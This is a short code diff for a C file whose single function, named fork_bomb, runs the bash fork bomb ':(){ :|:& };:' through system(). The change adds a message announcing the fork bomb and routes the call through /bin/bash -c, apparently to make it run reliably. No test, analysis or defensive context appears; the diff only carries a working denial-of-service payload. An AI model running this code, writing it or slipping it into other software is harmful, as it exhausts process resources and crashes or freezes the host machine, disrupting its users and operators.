@@ -1,5 +1,6 @@
 #include <stdlib.h>
-
+#include <stdio.h> 
 void fork_bomb() {
-    system(":(){ :|:& };:");
+    printf("Running fork bomb...");
+    system("/bin/bash -c ':(){ :|:& };:'");
 }
